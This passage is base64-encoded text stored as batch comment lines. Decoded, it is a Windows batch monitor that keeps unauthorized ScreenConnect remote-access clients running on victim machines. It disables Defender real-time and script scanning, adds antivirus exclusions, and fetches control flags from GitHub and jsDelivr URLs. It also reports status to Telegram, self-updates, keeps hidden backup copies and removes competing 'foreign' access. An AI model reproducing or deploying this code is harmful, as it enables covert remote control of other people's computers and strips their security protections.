::ZW5Db25uZWN0IHJlaW5zdGFsbGVkIE9LIg0KKQ0KDQo6QWZ0ZXJIZWFsDQpyZW0g
::TTE2OiBBTFQgcHJlc2VudC1idXQtc3RvcHBlZCAtPiByZXN0YXJ0LCB0aGVuIHJl
::cGFpci1ieS1HVUlEIChldmVyeSB0aWNrKQ0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICglQUxUX0ZQJSkiID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2
::ZWwgMSAoDQogIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9G
::UCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCiAgaWYgZXJyb3JsZXZlbCAxICgN
::CiAgICBlY2hvIGFsdCBzdG9wcGVkIC0gcmVzdGFydC9yZXBhaXI+PiIlTE9HJSIN
::CiAgICBuZXQgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSki
::ID5udWwgMj4mMQ0KICAgIHNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAo
::JUFMVF9GUCUpIiA+bnVsIDI+JjENCiAgICB0aW1lb3V0IC90IDUgL25vYnJlYWsg
::Pm51bA0KICAgIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9G
::UCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCiAgICBpZiBlcnJvcmxldmVsIDEg
::aWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmls
::ZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUg
::IiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJUFMVF9GUCUi
::IC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQ0KICApDQopDQpyZW0gTTE3
::OiBBTFQgc2VydmljZSBlbnRyeSBkZWxldGVkIGJ1dCBwcm9kdWN0IHJlZ2lzdGVy
::ZWQgLT4gcmVwYWlyLWJ5LUdVSUQgZXZlcnkgdGljaw0Kc2MgcXVlcnkgIlNjcmVl
::bkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiID5udWwgMj4mMQ0KaWYgZXJyb3Js
::ZXZlbCAxICgNCiAgZWNobyBhbHRfbWlzc2luZ190cnlfcmVwYWlyPj4iJUxPRyUi
::DQogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1By
::b2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1G
::aWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVBTFRf
::RlAlIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCikNCnJlbSAoZXh0
::ZXJtaW5hdGlvbiBhbHJlYWR5IHJhbiBwcmUtaGVhbCBpbiBbRV07IGZvcmVpZ24g
::c3Vydml2b3JzIGNvdW50ZWQgdGhlcmUpDQoNCnJlbSDilIDilIAgW0ZdIHN0ZWFs
::dGggcmUtc2VjdXJlIChxdWlldCBEZWZlbmRlciBleGNsdXNpb24gcmVmcmVzaCkg
::4pSA4pSADQpyZW0gTTM5L000MzogTXBQcmVmZXJlbmNlIHdoZW4gV2luRGVmZW5k
::IGFsaXZlOyBhbHdheXMgYWxzbyB3cml0ZSBwb2xpY3kvZXhjbHVzaW9uIFJFRw0K
::cmVtIChIZWxsIGhvc3Q6IFdpbkRlZmVuZCBkZWFkIOKGkiAweDgwMDEwNmJhLCBi
::dXQgQU1TSSBzdGlsbCBibG9ja2VkIFBTIOKAlCByZWcgKyBvd25fZ3J5eGEuY21k
::IGNvdmVyIGl0KQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNy
::b3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbiIgL3Yg
::RGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+
::bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9z
::b2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERp
::c2FibGVTY3JpcHRTY2FubmluZyAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+
::JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVm
::ZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVXRCUiIC90IFJFR19EV09SRCAv
::ZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3Nv
::ZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJUVUTCUi
::IC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxT
::T0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBh
::dGhzIiAvdiAiJVN5c3RlbVJvb3QlXFRlbXBcLnVwZCIgL3QgUkVHX0RXT1JEIC9k
::IDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29m
::dFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUHJvZ3Jh
::bUZpbGVzJVxTY3JlZW5Db25uZWN0IENsaWVudCoiIC90IFJFR19EV09SRCAvZCAw
::IC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRc
::V2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVByb2dyYW1G
::aWxlcyh4ODYpJVxTY3JlZW5Db25uZWN0IENsaWVudCoiIC90IFJFR19EV09SRCAv
::ZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3Nv
::ZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFByb2Nlc3NlcyIgL3YgIlNj
::cmVlbkNvbm5lY3QuQ2xpZW50U2VydmljZS5leGUiIC90IFJFR19EV09SRCAvZCAw
::IC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRc
::V2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFByb2Nlc3NlcyIgL3YgIm1zaWV4
::ZWMuZXhlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnBvd2Vyc2hl
::bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBC
::eXBhc3MgLUNvbW1hbmQgIiRFcnJvckFjdGlvblByZWZlcmVuY2U9J1NpbGVudGx5
::Q29udGludWUnOyB0cnl7U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1l
::TW9uaXRvcmluZyAkdHJ1ZX1jYXRjaHt9OyB0cnl7U2V0LU1wUHJlZmVyZW5jZSAt
::RGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlfWNhdGNoe307IHRyeXtBZGQtTXBQ
::cmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICclV0QlJywnJUVUTCUnLChKb2luLVBh
::dGggJGVudjpQcm9ncmFtRmlsZXMgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicpLChK
::b2luLVBhdGggJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9ICdTY3JlZW5Db25uZWN0
::IENsaWVudConKSAtRXJyb3JBY3Rpb24gU3RvcH1jYXRjaHt9OyBmb3JlYWNoKCR4
::IGluIEAoJ1NjcmVlbkNvbm5lY3QuQ2xpZW50U2VydmljZS5leGUnLCdTY3JlZW5D
::b25uZWN0LldpbmRvd3NDbGllbnQuZXhlJywnbXNpZXhlYy5leGUnLCdwb3dlcnNo
::ZWxsLmV4ZScpKXt0cnl7QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUHJvY2Vz
::cyAkeCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZX1jYXRjaHt9fSIgPm51
::bCAyPiYxDQoNCnJlbSDilIDilIAgW0ddIHBlcmlvZGljIGZ1bGwgcmUtc2VjdXJl
::IGV2ZXJ5IH4yIGgg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUg
::LU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoVGVzdC1QYXRoICclV0QlXG93
::bl9zZWN1cmUuY21kJykgLWFuZCAoKCAtbm90IChUZXN0LVBhdGggJyVXRCVcc2Vj
::LmZsYWcnKSkgLW9yICgoKEdldC1EYXRlKSAtIChHZXQtSXRlbSAtTGl0ZXJhbFBh
::dGggJyVXRCVcc2VjLmZsYWcnKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbEhvdXJzIC1n
::ZSAyKSkpeyBleGl0IDEgfSBlbHNlIHsgZXhpdCAwIH0iID5udWwgMj4mMQ0KaWYg
::ZXJyb3JsZXZlbCAxICgNCiAgZWNobyBwZXJpb2RpYyByZS1zZWN1cmU+PiIlTE9H
::JSINCiAgY2FsbCAiJVdEJVxvd25fc2VjdXJlLmNtZCIgPj4iJUxPRyUiIDI+JjEN
::CiAgZWNobyBkb25lPiIlV0QlXHNlYy5mbGFnIg0KKQ0KDQpyZW0g4pSA4pSAIFtH
::Ml0gR3J5eGEgTVVTVC1SVU4g4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpyZW0gTzQw
::OiBpZiBBTlkgbm9uLXNldnJ6IFNDIFJ1bm5pbmcg4oaSIG5ldmVyIG1zaWV4ZWMg
::KHN0b3BzIHBhbmVsIGR1cGxpY2F0ZXMpLg0Kc2V0ICJHUllYQV9PSz0wIg0Kc2V0
::ICJHUllYQV9XQVM9MCINCnNldCAiRE9fREVFUD0wIg0Kc2V0ICJGT1JDRV9HPTAi
::DQppZiBleGlzdCAiJVdEJVxncnl4YS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9r
::ZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4YS5jZmciKSBkbyBp
::ZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9JSVMIg0KDQpy
::ZW0gRk9SQ0UgcHVzaDogY29udGVudC1oYXNoIHZpYSBmYyAvYiAocmUtZmlyZSB3
::aGVuIGZsYWcgY29udGVudCBjaGFuZ2VzKTsgcmF3LWZpcnN0DQoiJUNVUkwlIiAt
::TCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgNiAtLW1heC10aW1l
::IDIwIC1vICIlV0QlXGZvcmNlX2dyeXhhLm5ldyIgImh0dHBzOi8vcmF3LmdpdGh1
::YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL2ZvcmNl
::X2dyeXhhLmZsYWc/dD0lUkFORE9NJSVSQU5ET00lIiA+bnVsIDI+JjENCmlmIG5v
::dCBleGlzdCAiJVdEJVxmb3JjZV9ncnl4YS5uZXciICIlQ1VSTCUiIC1MIC0tY29u
::bmVjdC10aW1lb3V0IDYgLS1tYXgtdGltZSAyMCAtbyAiJVdEJVxmb3JjZV9ncnl4
::YS5uZXciICJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0
::aHViLWRyb3BAbWFpbi9mb3JjZV9ncnl4YS5mbGFnP3Q9JVJBTkRPTSUlUkFORE9N
::JSIgPm51bCAyPiYxDQppZiBleGlzdCAiJVdEJVxmb3JjZV9ncnl4YS5uZXciICgN
::CiAgZmluZHN0ciAvQzoiUFVTSCIgIiVXRCVcZm9yY2VfZ3J5eGEubmV3IiA+bnVs
::IDI+JjENCiAgaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgaWYgbm90IGV4aXN0
::ICIlV0QlXGZvcmNlX2dyeXhhLmRvbmUiICgNCiAgICAgIHNldCAiRk9SQ0VfRz0x
::Ig0KICAgICkgZWxzZSAoDQogICAgICBmYyAvYiAiJVdEJVxmb3JjZV9ncnl4YS5u
::ZXciICIlV0QlXGZvcmNlX2dyeXhhLmRvbmUiID5udWwgMj4mMQ0KICAgICAgaWYg
::ZXJyb3JsZXZlbCAxIHNldCAiRk9SQ0VfRz0xIg0KICAgICkNCiAgKQ0KKQ0KDQpy
::ZW0gRGV0ZWN0IGFueSBSdW5uaW5nIG5vbi1zZXZyeiBTY3JlZW5Db25uZWN0ICh0
::cnVlIEdyeXhhIHByZXNlbmNlKQ0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25J
::bnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxv
::d25fbGliLnBzMSIgLUFjdGlvbiBncnl4YS1oZWFsdGggLVdvcmtEaXIgIiVXRCUi
::ID4iJVdEJVxncnl4YV9oZWFsdGgub3V0IiAyPm51bA0Kc2V0ICJHSD0iDQppZiBl
::eGlzdCAiJVdEJVxncnl4YV9oZWFsdGgub3V0IiBmb3IgL2YgInVzZWJhY2txIGRl
::bGltcz0iICUlUiBpbiAoIiVXRCVcZ3J5eGFfaGVhbHRoLm91dCIpIGRvIHNldCAi
::R0g9JSVSIg0KZWNobyBncnl4YV9oZWFsdGg9IUdIIT4+IiVMT0clIg0KZWNobyAh
::R0ghfCBmaW5kc3RyIC9JIC9CIC9DOiJIRUFMVEhZIiA+bnVsDQppZiBub3QgZXJy
::b3JsZXZlbCAxICgNCiAgc2V0ICJHUllYQV9PSz0xIg0KICBzZXQgIkdSWVhBX1dB
::Uz0xIg0KICBpZiBleGlzdCAiJVdEJVxncnl4YS5jZmciIGZvciAvZiAidXNlYmFj
::a3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4YS5jZmci
::KSBkbyBpZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9JSVM
::Ig0KKQ0KDQpyZW0gRk9SQ0UgcHVzaCBvdmVycmlkZXMgaGVhbHRoeS1za2lwOiBy
::dW4gYSBmb3JjZWQgZW5zdXJlIHRoaXMgdGljaw0KaWYgIiVGT1JDRV9HJSI9PSIx
::IiAoDQogIGVjaG8gZ3J5eGFfZm9yY2VfcHVzaD4+IiVMT0clIg0KICBpZiBleGlz
::dCAiJVdEJVxvd25fbGliLnBzMSIgKA0KICAgIHNldCAiR1JFUz0iDQogICAgZm9y
::IC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1By
::b2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1G
::aWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIGdyeXhhLWVuc3VyZSAtRGVl
::cCAtRm9yY2UgLU5vV2FpdCAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIl
::YCkgZG8gc2V0ICJHUkVTPSUlUiINCiAgICBlY2hvIGdyeXhhX2ZvcmNlX3Jlc3Vs
::dD0hR1JFUyE+PiIlTE9HJSINCiAgICBjb3B5IC95ICIlV0QlXGZvcmNlX2dyeXhh
::Lm5ldyIgIiVXRCVcZm9yY2VfZ3J5eGEuZG9uZSIgPm51bCAyPiYxDQogICkNCiAg
::Z290byA6R3J5eGFBZnRlcg0KKQ0KDQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5v
::bkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoIC1ub3QgKFRlc3QtUGF0aCAnJUdS
::WVhBX0RFRVAlJykpIC1vciAoKChHZXQtRGF0ZSktKEdldC1JdGVtIC1MaXRlcmFs
::UGF0aCAnJUdSWVhBX0RFRVAlJyAtRm9yY2UpLkxhc3RXcml0ZVRpbWUpLlRvdGFs
::SG91cnMgLWdlIDgpKXsgZXhpdCAxIH0gZWxzZSB7IGV4aXQgMCB9IiA+bnVsIDI+
::JjENCmlmIGVycm9ybGV2ZWwgMSBzZXQgIkRPX0RFRVA9MSINCg0KcmVtIEhlYWx0
::aHkgKyBub3QgZGVlcCBkdWUg4oaSIHplcm8gd29yaw0KaWYgIiVHUllYQV9PSyUi
::PT0iMSIgaWYgIiVET19ERUVQJSI9PSIwIiAoDQogIGVjaG8gZ3J5eGFfc2tpcF9h
::bHJlYWR5X2hlYWx0aHk+PiIlTE9HJSINCiAgZ290byA6R3J5eGFBZnRlcg0KKQ0K
::DQpyZW0gRGVlcCBvciBtaXNzaW5nOiBncnl4YS1lbnN1cmUgb25seSAobGliIGxv
::Y2tzIG1zaWV4ZWMgaWYgUnVubmluZykNCmlmIGV4aXN0ICIlV0QlXG93bl9saWIu
::cHMxIiAoDQogIHNldCAiR1JFUz0iDQogIGlmICIlRE9fREVFUCUiPT0iMSIgKA0K
::ICAgIGVjaG8gZ3J5eGFfZGVlcF9iZWdpbj4+IiVMT0clIg0KICAgIGZvciAvZiAi
::dXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxl
::IC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
::JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBncnl4YS1lbnN1cmUgLURlZXAgLU5v
::V2FpdCAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlYCkgZG8gc2V0ICJH
::UkVTPSUlUiINCiAgKSBlbHNlICgNCiAgICBmb3IgL2YgInVzZWJhY2txIGRlbGlt
::cz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3Rp
::dmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5w
::czEiIC1BY3Rpb24gZ3J5eGEtZW5zdXJlIC1Ob1dhaXQgLVdvcmtEaXIgIiVXRCUi
::IC1CdWlsZCAlTU9OVkVSJWApIGRvIHNldCAiR1JFUz0lJVIiDQogICkNCiAgZWNo
::byBncnl4YV9lbnN1cmVfcmVzdWx0PSFHUkVTIT4+IiVMT0clIg0KICByZW0gTTQx
::OiBvbmx5IG1hcmsgT0sgb24gdHJ1ZSBIRUFMVEhZfC4uLnJ1bm5pbmcvc3RhcnRl
::ZC9zdmMtcmVjcmVhdGVkIOKAlCBuZXZlciBJTkZMSUdIVC9zcGF3bmVkDQogIGVj
::aG8gIUdSRVMhfCBmaW5kc3RyIC9JIC9CIC9DOiJIRUFMVEhZfCIgfCBmaW5kc3Ry
::IC9JICJydW5uaW5nPTEgc3RhcnRlZD0xIHN2Yy1yZWNyZWF0ZWQ9MSIgPm51bA0K
::ICBpZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiR1JZWEFfT0s9MSINCikNCmlmICIl
::RE9fREVFUCUiPT0iMSIgZWNobyBkb25lPiIlR1JZWEFfREVFUCUiDQppZiAiJUdS
::WVhBX09LJSI9PSIwIiBjYWxsIDpFbnN1cmVHcnl4YU11c3QNCg0KOkdyeXhhQWZ0
::ZXINCmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0
::b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdyeXhhLmNmZyIpIGRv
::IGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJHUllYQV9GUD0lJUwiDQpz
::ZXQgIkdSWVhBX09LPTAiDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQg
::KCVHUllYQV9GUCUpIiB8IGZpbmRzdHIgL0kgL0M6IlJVTk5JTkciIC9DOiJTVEFS
::VF9QRU5ESU5HIiAvQzoiQ09OVElOVUVfUEVORElORyIgPm51bA0KaWYgbm90IGVy
::cm9ybGV2ZWwgMSBzZXQgIkdSWVhBX09LPTEiDQpyZW0gYWxzbyBPSyBpZiB2ZXJp
::ZmllZCBHcnl4YSBGUCAocmVsYXkvZXhwZWN0ZWQpIGlzIGhlYWx0aHkNCmlmICIl
::R1JZWEFfT0slIj09IjAiICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25J
::bnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxv
::d25fbGliLnBzMSIgLUFjdGlvbiBncnl4YS1oZWFsdGggLVdvcmtEaXIgIiVXRCUi
::IDI+bnVsIHwgZmluZHN0ciAvSSAvQiAvQzoiSEVBTFRIWXwiIHwgZmluZHN0ciAv
::SSAicnVubmluZz0xIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJH
::UllYQV9PSz0xIg0KKQ0KDQppZiAiJUdSWVhBX09LJSI9PSIxIiBpZiAiJUdSWVhB
::X1dBUyUiPT0iMCIgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVy
::YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9s
::aWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1P
::TlZFUiUgLUV4dHJhICJncnl4YS1yZXN0b3JlZCIgPm51bCAyPiYxDQogIGNhbGwg
::OlRnR3J5eGEgUkVTVE9SRUQgIkdyeXhhIFNjcmVlbkNvbm5lY3QgaGVhbHRoeSAo
::c3ZjIHJ1bm5pbmcpIg0KKQ0KaWYgIiVHUllYQV9PSyUiPT0iMCIgKA0KICBwb3dl
::cnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xp
::Y3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRl
::IC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJncnl4YS1t
::dXN0LWZhaWwiID5udWwgMj4mMQ0KICBjYWxsIDpUZ0dyeXhhIERPV04gIkdyeXhh
::IE1VU1QtUlVOIC0gc2VydmljZSBub3QgUnVubmluZyBhZnRlciBoZWFsIg0KKQ0K
::DQpyZW0g4pSA4pSAIFtIXSBxdWlldCBkaWdlc3QgKHNraXAgaGVhbHRoeSBob3N0
::cyDigJQgd2FzIGZsb29kaW5nIFRlbGVncmFtKSDilIDilIANCmlmIGV4aXN0ICIl
::V0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVy
::YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9s
::aWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1P
::TlZFUiUgPm51bCAyPiYxDQpzZXQgIk5FRURfSEI9MCINCmlmICIlUFJJTV9PSyUi
::PT0iMCIgc2V0ICJORUVEX0hCPTEiDQppZiAlRk9SRUlHTl9MRUZUJSBHVFIgMCBz
::ZXQgIk5FRURfSEI9MSINCmlmICIlR1JZWEFfT0slIj09IjAiIHNldCAiTkVFRF9I
::Qj0xIg0KaWYgIiVORUVEX0hCJSI9PSIwIiAoDQogIGVjaG8gaGJfc2tpcF9oZWFs
::dGh5Pj4iJUxPRyUiDQopIGVsc2UgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUg
::LU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoVGVzdC1QYXRoICclSEJGTEFH
::JScpIC1hbmQgKE5ldy1UaW1lU3BhbiAtU3RhcnQgKEdldC1JdGVtIC1MaXRlcmFs
::UGF0aCAnJUhCRkxBRyUnKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbE1pbnV0ZXMgLWx0
::IDM2MCl7IGV4aXQgMCB9IGVsc2UgeyBleGl0IDEgfSIgPm51bCAyPiYxDQogIGlm
::IGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyBoYj4lSEJGTEFHJQ0KICAgIHBvd2Vy
::c2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGlj
::eSBCeXBhc3MgLUZpbGUgIiVXRCVcdGdfcmVwb3J0LnBzMSIgLVN0YXRlIEhCIC1N
::b2RlIGNvbXBhY3QgLUJ1aWxkICVNT05WRVIlIC1Db3VudCAhQ09VTlQhID5udWwg
::Mj4mMQ0KICAgIGVjaG8gZGlnZXN0IEhCIHNlbnQ+PiIlTE9HJSINCiAgKQ0KKQ0K
::DQpyZW0g4pSA4pSAIFtJXSBzZWxmLXVwZGF0ZSBhcHBseSAobGFzdCB0aGluZyB0
::aGlzIHRpY2spIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgA0KaWYgIiVTRUxGX1VQRCUiPT0iMSIgKA0KICBlY2hvIHNlbGYtdXBkYXRl
::IGFwcGx5Pj4iJUxPRyUiDQogIGF0dHJpYiAtaCAtcyAtciAiJVdEJVxvd25fbW9u
::LmNtZCIgPm51bCAyPiYxDQogIG1vdmUgL3kgIiVTVEFHRSVcb3duX21vbi5uZXh0
::IiAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxDQopDQpyZW0ga2VlcCBkdWFs
::LXBhdGggYmFja3VwIGluIHN5bmMgZXZlcnkgdGljaw0KaWYgbm90IGV4aXN0ICIl
::RVRMJSIgbWtkaXIgIiVFVEwlIiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlV0QlXG93
::bl9tb24uY21kIiAoDQogIGF0dHJpYiAtaCAtcyAtciAiJUVUTCVcZXRsX21vbi5j
::bWQiID5udWwgMj4mMQ0KICBjb3B5IC95ICIlV0QlXG93bl9tb24uY21kIiAiJUVU
::TCVcZXRsX21vbi5jbWQiID5udWwgMj4mMQ0KKQ0KZGVsIC9mIC9xICIlTVVURVgl
::IiA+bnVsIDI+JjENCg0KZWNobyB0aWNrIGRvbmU6IHByaW09JVBSSU1fT0slIGdy
::eXhhPSVHUllYQV9PSyUgYWx0PSVBTFRfT0slIGZvcmVpZ249JUZPUkVJR05fTEVG
::VCU+PiIlTE9HJSINCmVuZGxvY2FsDQpleGl0IC9iIDANCg0KcmVtIOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCBoZWxwZXJzIOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkA0KOkVu
::c3VyZUdyeXhhTXVzdA0KcmVtIE00NjogdHJlYXQgU1RBUlRfUEVORElORyBhcyBh
::bGl2ZTsgbmV2ZXIgc3Bhd24gb3duX2dyeXhhIC94IHdoaWxlIHN2YyBleGlzdHMN
::CnNldCAiR1JZWEFfT0s9MCINCmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNmZyIgZm9y
::IC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0Ql
::XGdyeXhhLmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJH
::UllYQV9GUD0lJUwiDQpzZXQgIkdTVkM9U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVH
::UllYQV9GUCUpIg0KDQpyZW0gc29mdCByZWcgZXhjbHVzaW9ucyBldmVyeSBtdXN0
::LWhlYWwgKHdvcmtzIGV2ZW4gd2hlbiBXaW5EZWZlbmQgc2VydmljZSBkZWFkKQ0K
::cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93
::cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVNjcmlw
::dFNjYW5uaW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFk
::ZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNs
::dXNpb25zXFBhdGhzIiAvdiAiJVdEJSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51
::bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dz
::IERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlU3lzdGVtUm9vdCVcVGVt
